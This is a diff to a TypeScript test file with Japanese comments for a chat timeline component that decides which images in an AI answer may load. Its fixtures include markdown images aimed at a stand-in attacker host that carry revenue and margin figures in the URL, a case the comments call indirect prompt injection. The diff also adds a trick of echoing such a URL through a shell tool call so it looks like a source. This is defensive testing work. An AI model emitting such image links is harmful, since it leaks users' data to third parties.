@@ -12,6 +12,10 @@ import { MessageTimeline, type TimelineSegment } from "@/components/chat/message
 
 /// web_fetch がページの本文に残す画像（Markdown の画像記法）。
 const PAGE_IMAGE = "https://images.example.test/market/saas-share-2026.png";
+/// 括弧と `|` を含む画像（htmd は括弧を `\(` とエスケープし、react-markdown は `|` を `%7C` にする）。
+const CHART_IMAGE = "https://charts.example.test/render_(v2).png?series=41|27|32";
+/// モデル自身が書いた文字列（シェルの出力）にだけ現れる URL。出所に数えてはいけない。
+const ECHOED_IMAGE = "https://collector.attacker.test/e?d=Q3%20margin%2018%25";
 
 /// 出典に現れた画像と、出典に無い画像を混ぜた回答。
 const ANSWER = [
@@ -26,6 +30,16 @@ const ANSWER = [
   "",
   // 出典に一度も現れない外部ホスト（間接プロンプトインジェクションの典型）。
   "参考: ![](https://collector.attacker.test/p?d=Q3%20revenue%2012.4B) 以上が要点です。",
+  "",
+  "内訳の推移は次のとおりです。",
+  "",
+  `![内訳グラフ](${CHART_IMAGE})`,
+  "",
+  // シェルに echo させて自分の出力に載せた URL（出所のふりをさせる）。
+  `![](${ECHOED_IMAGE})`,
+  "",
+  // リンクの中の画像（README のバッジなど）。読み込まないときもリンクを入れ子にしない。
+  "ビルドの状態: [![build](https://badge.example.test/ci.svg)](https://ci.example.test/runs/1)",
 ].join("\n");
 
 const SEGMENTS: TimelineSegment[] = [
@@ -49,11 +63,25 @@ const SEGMENTS: TimelineSegment[] = [
           "",
           "分野別のシェアは次のとおり。",
           "",
-          `![分野別シェア](${PAGE_IMAGE} "図 1")`,
+          `![分野別シェア](${PAGE_IMAGE})`,
+          "",
+          `![内訳グラフ](${CHART_IMAGE.replace("(", "\\(").replace(")", "\\)")})`,
           "",
           "業務アプリ 41%、情報系 27%、その他 32%。",
           "</web_page>",
+          // 封筒の外（こちらが生成した案内）は出所に数えない。
+          `続きは query="![](${ECHOED_IMAGE})" で読めます。`,
         ].join("\n"),
+      },
+      {
+        key: "s1",
+        id: "s1",
+        name: "shell",
+        running: false,
+        ok: true,
+        step: 1,
+        input: { command: `echo '![](${ECHOED_IMAGE})'` },
+        result: `![](${ECHOED_IMAGE})\n`,
       },
     ],
   },
